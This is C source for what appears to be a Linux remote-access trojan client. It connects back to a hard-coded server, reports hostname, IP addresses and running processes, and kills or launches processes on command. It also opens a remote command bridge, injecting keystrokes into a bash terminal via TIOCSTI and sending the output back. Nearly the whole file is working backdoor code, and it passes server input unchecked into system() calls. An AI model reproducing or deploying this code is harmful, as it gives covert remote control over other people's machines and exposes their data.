#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/ioctl.h>

void writeLine(char* data, int dataLength)
{
    for (int i = 0; i < dataLength; i++)
    {
	printf("%c", *data);
	data++;
    }
    printf("%s", "\r\n");

    fflush(stdout);
}

void writeString(char* data)
{
    printf("%s\r\n", data);
    fflush(stdout);
}

int sendCommand(int sock, char* command)
{
    int result;
    result = send(sock, command, strlen(command), 0);
    return result;
}

int StartsWith(char* src, char* cmp)
{
    if (strncmp(src, cmp, strlen(cmp)) == 0) return 1;
    return 0;
}

char *readFile(char* filename, int* fileSizeRet)
{
    FILE *file;
    if (access(filename, F_OK) == -1)
    {
	if (fileSizeRet != NULL) fileSizeRet = -1;
	return NULL;
    }
    file = fopen(filename, "r");
    fseek(file, 0L, SEEK_END);
    int fileSize = ftell(file) + 1;
    char* fileContent = malloc(fileSize * sizeof(char));
    memset(fileContent, 0, sizeof(fileContent));
    rewind(file);
    int bytesRead = fread(fileContent, fileSize, fileSize, file);
    if (fileSizeRet != NULL)
    {
	*fileSizeRet = fileSize;
    }
    return fileContent;
}

int _socket;

void onExit(void)
{
    char* command = "dclient";
    writeString("onExit");
    send(_socket, command, sizeof(command), 0);
    sleep(2);
    close(_socket);
}

void signalHandler(int signal)
{
    printf("Signal: %d", signal);
    fflush(stdout);
    onExit();
    writeString("onExit called");
}

int firstIndexOf(char* data, char find, int bytesRead, int ignore)
{
    for (int i = 0; i < bytesRead; i++)
    {
	if (*data == find)
	{
	    if (ignore == 0)
	    {
		return i;
	    }
	    else
	    {
		ignore--;
	    }
	}

	data++;
    }

    return -1;
}

void Substring(char* destination, char* source, int copyLength)
{
//    writeString("Start of substring!");
    for (int i = 0; i < copyLength; i++)
    {
//	printf("%c", *source);
	*destination = *source;
	source++;
	destination++;
    }
    *destination = '\0';
}

void* ExecuteShell()
{
	system("bash");
	writeString("after bash command at Bind & Execute");
}

//Remote Shell variables

char* deviceLink;
char* clientHomeDir;
char* shellprocID;
int shellFd;
int letReadRun;

void* ConnectShell()
{
    if(deviceLink != NULL) memset(deviceLink, 0, sizeof(deviceLink));
    else deviceLink = malloc(128);
    shellprocID = malloc(16);
    memset(shellprocID, 0, sizeof(shellprocID));
    sleep(5);
    system("pidof bash > pidof.txt");
    int fileSize = 0;
    char* fileContent = readFile("pidof.txt", &fileSize);
    //Get First PID in the list -> this is the last started bash shell
    int indexOfSpace = firstIndexOf(fileContent, ' ', fileSize, 0);
    char* shellPid = malloc(16);
    memset(shellPid, 0, sizeof(shellPid));
    Substring(shellPid, fileContent, indexOfSpace);
    strcpy(shellprocID, shellPid);
    free(fileContent);
    fileContent = NULL;
    system("rm pidof.txt");
    char* startCmd = malloc(256);
    memset(startCmd, 0, sizeof(startCmd));
    strcat(startCmd, "echo -n $(readlink -f /proc/");
    strcat(startCmd, shellPid);
    strcat(startCmd, "/fd/0) > rlink.txt");
    system(startCmd);
    free(shellPid);
    shellPid = NULL;
    free(startCmd);
    startCmd = NULL;
    fileSize = -1;
    char* devLink = readFile("rlink.txt", &fileSize);
    writeString("till substring");
    Substring(deviceLink, devLink, fileSize);
    writeString("till free");
    free(devLink);
    devLink = NULL;
    shellFd = -1;
    writeString("deviceLink:");
    writeString(deviceLink);
    shellFd = open(deviceLink, O_RDWR);
    if (shellFd == -1)
    {
        writeString("Failed to create shell file descriptor!");
    }
    system("rm rlink.txt");
}

char* cleanUpCommand()
{
    char* command = malloc(256);
    memset(command, 0, sizeof(command));
    memset(command, 0, sizeof(command));
    strcat(command, "echo -n  >");
    strcat(command, clientHomeDir);
    strcat(command, "/cmdout.txt");
    return command;
}

void* ReadStreamShell()
{
    clientHomeDir = malloc(128);
    memset(clientHomeDir, 0, sizeof(clientHomeDir));
    int fileSize = 0;
    system("echo -n $(pwd) > wd.txt");
    clientHomeDir = readFile("wd.txt", &fileSize);
	system("rm wd.txt");
//    strcat(clientHomeDir, fileContent);
    char* fullCommand = malloc(1024);
    memset(fullCommand, 0, sizeof(fullCommand));
    char* command = cleanUpCommand();
    int commandLength = strlen(command);
    char stackCommand[commandLength];
    memcpy(&stackCommand, command, commandLength);
    free(command);
    command = NULL;

    while (1)
    {
	if (letReadRun == 0) break;
	int fileSize = 0;
	char* fileContent = readFile("cmdout.txt", &fileSize);
	if (fileContent == NULL || fileSize == -1 || fileSize == 0)
	{
	    free(fileContent);
	    fileContent = NULL;
	    sleep(1);
	    continue;
	}
	if (strcmp(fileContent, "") != 0)
	{
	    memset(fullCommand, 0, sizeof(fullCommand));
	    strcat(fullCommand, "cmdout|");
	    strncat(fullCommand, fileContent, fileSize);
	    free(fileContent);
	    fileContent = NULL;
/*	    writeString("About to send as shell result:");
	    writeString(fullCommand);*/
	    int sendResult = send(_socket, fullCommand, strlen(fullCommand), 0);
	    if (sendResult == -1) writeString("Read Stream Shell failed to send output");
	    else
	    {
		writeLine(stackCommand, commandLength);
		system(stackCommand);
	    }
	}

	if (letReadRun == 0) break;
	sleep(1);
    }

    free(fullCommand);
    fullCommand = NULL;
    system("rm cmdout.txt");
}

void writeDevice(char* text, int *textLength, int* devFd)
{
    for (int i = 0; i < *textLength; i++)
    {
	ioctl(*devFd, TIOCSTI, text+i);
    }
}

int main()
{
    struct sockaddr_in server;
    char sendBuffer[1000], recvBuffer[2000];

    //Setup signal handlers

    signal(SIGINT, signalHandler);

    //Setup deviceLink var

    deviceLink = malloc(128);
    memset(deviceLink, 0, sizeof(deviceLink));

    //Create Socket
client_create_socket:
    _socket = socket(AF_INET, SOCK_STREAM, 0);
    if (_socket == -1)
    {
	printf("Socket is not created!");
	return 1;
    }

    puts("Socket Created!");
    server.sin_addr.s_addr = inet_addr("192.168.10.56"); //Specify the IP Address of your server here
    server.sin_family = AF_INET;
    server.sin_port = htons(100);
client_reconnect:
    if (connect(_socket, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
	    perror("Faild to connect to server!");
	    goto client_reconnect;
    }

    puts("Socket Connected!");
    sendCommand(_socket, "linuxClient");

    while (1)
    {
	memset(&recvBuffer, 0, sizeof(recvBuffer));
	int bytesRead = recv(_socket, recvBuffer, 2000, 0);
	if (bytesRead < 0)
	{
	    perror("Receive failed!");
	    return 1;
	}
	char msg[bytesRead];
	memcpy(&msg, &recvBuffer, bytesRead); //destination, source, size
	writeString("Server message: ");
	writeLine(&msg, bytesRead);
	if (StartsWith(&msg, "getinfo-"))
	{
	    char* clientID = malloc(8);
	    char* cmdStart = malloc(512);
	
	    memset(clientID, 0, sizeof(clientID));
	    memset(cmdStart, 0, sizeof(cmdStart));
	    Substring(clientID, &msg[8], bytesRead - 8);
	    strcat(cmdStart, "printf infoback\\;");
	    writeString(cmdStart);
	    strcat(cmdStart, clientID);
	    strcat(cmdStart, "\\;");
	    strcat(cmdStart, " > data.txt && echo -n $(hostname) >> data.txt && printf \\| >> data.txt && echo -n $(hostname -I) >> data.txt && printf \\| >> data.txt && echo -n $(date) >> data.txt && printf \\|N/A >> data.txt");
	    system(cmdStart);
	    char* fileData = readFile("data.txt", NULL);
	    send(_socket, fileData, strlen(fileData), 0);
	    free(fileData);
	    fileData = NULL;
	    free(clientID);
	    clientID = NULL;
	    free(cmdStart);
	    cmdStart = NULL;
	    system("rm data.txt");
	}

	if (strncmp(msg, "dc", bytesRead) == 0)
	{
	    sleep(2);
	    writeString("dclient sent and close'd application");
	    close(_socket);
	    memset(&recvBuffer, 0, sizeof(recvBuffer));
	    goto client_create_socket;
	}

	if (StartsWith(&msg, "msg|"))
	{
	    char* command = malloc(1024);
	    memset(command, 0, sizeof(command));
	    Substring(command, &msg[4], bytesRead - 4);
	    char* title = malloc(512);
	    memset(title, 0, sizeof(title));
	    int indexOfPipe = firstIndexOf(command, '|', bytesRead, 0);
	    if (indexOfPipe == -1) continue;
	    Substring(title, command, indexOfPipe);
	    char* message = malloc(512);
	    memset(message, 0, sizeof(message));
	    int indexOfSecondPipe = firstIndexOf(command, '|', bytesRead, 1);
	    if (indexOfSecondPipe == -1) continue;
	    Substring(message, command + indexOfPipe + 1, indexOfSecondPipe - indexOfPipe - 1);
	    char* shell = malloc(1024);
	    memset(shell, 0, sizeof(shell));
	    strcat(shell, "gnome-terminal -x sh -c \"echo \\\"\\\\t");
	    strcat(shell, title);
	    strcat(shell, "\\\\r\\\\n");
	    strcat(shell, message);
	    strcat(shell, "\\\" && bash\"");
	    system(shell);
	    free(shell);
	    shell = NULL;
	    free(title);
	    title = NULL;
	    free(message);
	    message = NULL;
	    free(command);
	    command = NULL;
	}

	if (StartsWith(&msg, "cd"))
	{
	    char* option = malloc(32);
	    memset(option, 0, sizeof(option));
	    int indexOfPipe = firstIndexOf(msg, '|', bytesRead, 0);
	    if (indexOfPipe == -1) continue;
	    int optLength = bytesRead - indexOfPipe - 1;
	    Substring(option, &msg[indexOfPipe + 1], optLength);
	    if (strncmp(option, "open", optLength) == 0)
	    {
		system("eject");
	    }
	    if (strncmp(option, "close", optLength) == 0)
	    {
		system("eject -t");
	    }

	    free(option);
	    option = NULL;
	}

	if (StartsWith(&msg, "emt|"))
	{
	    char* element = malloc(32);
	    char* option = malloc(16);
	    memset(element, 0 ,sizeof(element));
	    memset(option, 0, sizeof(option));
	    int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
	    int optionLength = indexOfSecondPipe - 4;
	    int elementLength = bytesRead - indexOfSecondPipe - 1;
	    Substring(option, &msg[4], indexOfSecondPipe - 4);
	    Substring(element, &msg[indexOfSecondPipe + 1], bytesRead - indexOfSecondPipe - 1);
	    if (strncmp(element, "desktop", elementLength) == 0)
	    {
		if (strncmp(option, "show", optionLength) == 0)
		{
		    system("gsettings set org.gnome.desktop.background show-desktop-icons true");
		}

		if (strncmp(option, "hide", optionLength) == 0)
		{
		    system("gsettings set org.gnome.desktop.background show-desktop-icons false");
		}
	    }
	    free(element);
	    element = NULL;
	    free(option);
	    option = NULL;
	}

	if (strncmp(msg, "proclist", bytesRead) == 0)
	{
	    system("echo -n lprocset > proc.txt && ps -au >> proc.txt");
	    int fSize = 0;
	    char* fileContent = readFile("proc.txt", &fSize);
	    send(_socket, fileContent, fSize, 0);
	    free(fileContent);
	    fileContent = NULL;
	    system("rm proc.txt");
	}

	if (StartsWith(&msg, "prockill|"))
	{
	    char* shellCommand = malloc(128);
	    char* procID = malloc(16);
	    memset(procID, 0, sizeof(procID));
	    memset(shellCommand, 0, sizeof(shellCommand));
	    Substring(procID, &msg[9], bytesRead - 9);
	    strcat(shellCommand, "kill ");
	    strcat(shellCommand, procID);
	    system(shellCommand);
	    writeString(shellCommand);
	    free(shellCommand);
	    shellCommand = NULL;
	    free(procID);
	    procID = NULL;
	}

	if (StartsWith(&msg, "procstart|"))
	{
	    char* procName = malloc(256);
	    memset(procName, 0, sizeof(procName));
	    int indexOfSecondPipe = firstIndexOf(msg, '|', bytesRead, 1);
	    Substring(procName, &msg[10], indexOfSecondPipe - 10);
	    strcat(procName, " &");
	    system(procName);
	    free(procName);
	    procName = NULL;
	}

	if (strncmp(msg, "startcmd", bytesRead) == 0)
	{
	    writeString("Starting cmd bridge");
	    pthread_t threadID;
	    pthread_t conThreadID;
	    pthread_t rdThreadID;

	    letReadRun = 1;

	    int errorCode;
	    errorCode = pthread_create(&threadID, NULL, &ExecuteShell, NULL);
	    if (errorCode != 0) writeString("Shell execute failed!");
	    else writeString("pthread main Created");
	    errorCode = pthread_create(&conThreadID, NULL, &ConnectShell, NULL);
	    if (errorCode != 0) writeString("Shell connection thread start failed!");
	    else writeString("Connection Shell Started");
	    errorCode = pthread_create(&rdThreadID, NULL, &ReadStreamShell, NULL);
	    if (errorCode != 0) writeString("Failed to start cmd shell read thread");
	    else writeString("Shell read thread started");
	}

	if (StartsWith(&msg, "cmd|"))
	{
	    char* output = malloc(1536);
	    char* realCommand = malloc(512);
	    memset(output, 0, sizeof(output));
	    memset(realCommand, 0, sizeof(realCommand));
	    Substring(realCommand, &msg[4], bytesRead - 4);

	    if (shellFd == -1)
	    {
		writeString("Invalid File Descriptor!");
		continue; //Continue to read TCP stream, don't return, but exit this block
	    }

	    strcat(output, "echo \"$(");
	    strcat(output, realCommand);
	    strcat(output, ")\" > ");
	    strcat(output, clientHomeDir);
	    strcat(output, "/cmdout.txt\n\0");
	    int outLength = strlen(output);
	    writeDevice(output, &outLength, &shellFd);

	    free(output);
	    output = NULL;
	    free(realCommand);
	    realCommand = NULL;
	}

	if (strncmp(msg, "stopcmd", bytesRead) == 0)
	{
	    writeString("Entering stop cmd function");
	    letReadRun = 0;
	    int staticLength = 5;
	    close(shellFd);
	    writeString("file-d closed");
	    char killCommand[64];
//	    writeString("malloc completed");
	    memset(killCommand, 0, sizeof(killCommand));
	    strcat(killCommand, "kill ");
	    strcat(killCommand, shellprocID);
	    system(killCommand);
//	    free(killCommand);
//	    writeDevice("exit\n", &staticLength, &shellFd);
	    writeString("before free 1");
	    free(deviceLink);
	    deviceLink = NULL;
	    writeString("after free 1, before free 2");
	    free(clientHomeDir);
	    clientHomeDir = NULL;
	    writeString("after free 2");
	}

	memset(&recvBuffer, 0, sizeof(recvBuffer));
    }
}